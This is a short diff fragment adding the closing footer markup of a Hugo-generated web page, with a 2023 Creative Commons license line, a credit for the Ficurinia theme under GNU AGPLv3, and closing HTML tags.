+        2023 &copy; Licensed under <a href="https://creativecommons.org/licenses/by-nc/4.0/">Creative Commons Attribution 4.0 International License</a>.
+    </small></p>
+    <p><small>
+        <a href='https://gitlab.com/gabmus/hugo-ficurinia'>Ficurinia theme</a> for <a href='https://gohugo.io'>Hugo</a> by <a href='https://gabmus.org'>Gabriele Musco</a>. Licensed under <a href='https://www.gnu.org/licenses/agpl-3.0.html'>GNU AGPLv3</a>.
+    </small></p>
+</footer>
+</div>
+            </div>
+        </div>
+
+
+</body>
+</html>
